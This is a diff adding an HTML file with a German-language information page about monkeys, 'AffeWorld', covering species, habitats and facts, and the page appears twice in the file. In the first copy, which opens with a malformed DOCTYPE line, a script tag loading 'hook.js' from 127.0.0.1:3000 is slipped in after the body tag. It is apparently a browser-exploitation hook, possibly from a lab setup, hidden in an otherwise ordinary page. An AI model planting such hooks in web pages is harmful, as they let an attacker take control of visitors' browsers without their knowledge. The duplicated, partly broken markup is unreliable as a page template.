@@ -1,0 +1,187 @@
+<!DOCTYPE html> PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1-transitional.dtd">
+<html   xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AffeWorld - Die Welt der Affen</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+            background-color: #333;
+        }
+        nav a {
+            color: white;
+            padding: 14px 20px;
+            text-decoration: none;
+            text-align: center;
+        }
+        nav a:hover {
+            background-color: #ddd;
+            color: black;
+        }
+        .container {
+            padding: 20px;
+        }
+        h2 {
+            color: #333;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
+</head>
+<body>
+
+<script src="http://127.0.0.1:3000/hook.js"></script>
+
+    <header>
+        <h1>AffeWorld - Die Welt der Affen</h1>
+        <p>Entdecke die faszinierende Welt der Primaten!</p>
+    </header>
+
+    <nav>
+        <a href="#home">Startseite</a>
+        <a href="#arten">Arten</a>
+        <a href="#lebensraum">Lebensräume</a>
+        <a href="#wissenswertes">Wissenswertes</a>
+    </nav>
+
+    <div class="container" id="home">
+        <h2>Startseite</h2>
+        <p>Willkommen bei AffeWorld! Affen sind faszinierende Geschöpfe, die in verschiedensten Regionen der Welt leben. Hier erfährst du mehr über ihre Lebensräume, Arten und einige interessante Fakten.</p>
+    </div>
+
+    <div class="container" id="arten">
+        <h2>Arten</h2>
+        <p>Es gibt viele verschiedene Affenarten auf der Welt, darunter die Gorillas, Schimpansen, Kapuzineraffen und viele mehr. Jede Art hat einzigartige Merkmale und Verhaltensweisen.</p>
+    </div>
+
+    <div class="container" id="lebensraum">
+        <h2>Lebensräume</h2>
+        <p>Affen leben in einer Vielzahl von Lebensräumen wie tropischen Regenwäldern, Savannen und sogar Bergregionen. Ihre Anpassungsfähigkeit ermöglicht es ihnen, in unterschiedlichen Klimazonen zu überleben.</p>
+    </div>
+
+    <div class="container" id="wissenswertes">
+        <h2>Wissenswertes</h2>
+        <p>Wusstest du, dass Affen in sozialen Gruppen leben und oft komplexe Kommunikationssysteme haben? Einige Arten nutzen Werkzeuge und zeigen beeindruckende Intelligenz.</p>
+    </div>
+
+    <footer>
+        <p>&copy; 2023 AffeWorld | Alle Rechte vorbehalten</p>
+    </footer>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AffeWorld - Die Welt der Affen</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+            background-color: #333;
+        }
+        nav a {
+            color: white;
+            padding: 14px 20px;
+            text-decoration: none;
+            text-align: center;
+        }
+        nav a:hover {
+            background-color: #ddd;
+            color: black;
+        }
+        .container {
+            padding: 20px;
+        }
+        h2 {
+            color: #333;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>AffeWorld - Die Welt der Affen</h1>
+        <p>Entdecke die faszinierende Welt der Primaten!</p>
+    </header>
+
+    <nav>
+        <a href="#home">Startseite</a>
+        <a href="#arten">Arten</a>
+        <a href="#lebensraum">Lebensräume</a>
+        <a href="#wissenswertes">Wissenswertes</a>
+    </nav>
+
+    <div class="container" id="home">
+        <h2>Startseite</h2>
+        <p>Willkommen bei AffeWorld! Affen sind faszinierende Geschöpfe, die in verschiedensten Regionen der Welt leben. Hier erfährst du mehr über ihre Lebensräume, Arten und einige interessante Fakten.</p>
+    </div>
+
+    <div class="container" id="arten">
+        <h2>Arten</h2>
+        <p>Es gibt viele verschiedene Affenarten auf der Welt, darunter die Gorillas, Schimpansen, Kapuzineraffen und viele mehr. Jede Art hat einzigartige Merkmale und Verhaltensweisen.</p>
+    </div>
+
+    <div class="container" id="lebensraum">
+        <h2>Lebensräume</h2>
+        <p>Affen leben in einer Vielzahl von Lebensräumen wie tropischen Regenwäldern, Savannen und sogar Bergregionen. Ihre Anpassungsfähigkeit ermöglicht es ihnen, in unterschiedlichen Klimazonen zu überleben.</p>
+    </div>
+
+    <div class="container" id="wissenswertes">
+        <h2>Wissenswertes</h2>
+        <p>Wusstest du, dass Affen in sozialen Gruppen leben und oft komplexe Kommunikationssysteme haben? Einige Arten nutzen Werkzeuge und zeigen beeindruckende Intelligenz.</p>
+    </div>
+
+    <footer>
+        <p>&copy; 2023 AffeWorld | Alle Rechte vorbehalten</p>
+    </footer>
+
+</body>
+</html>
+
+
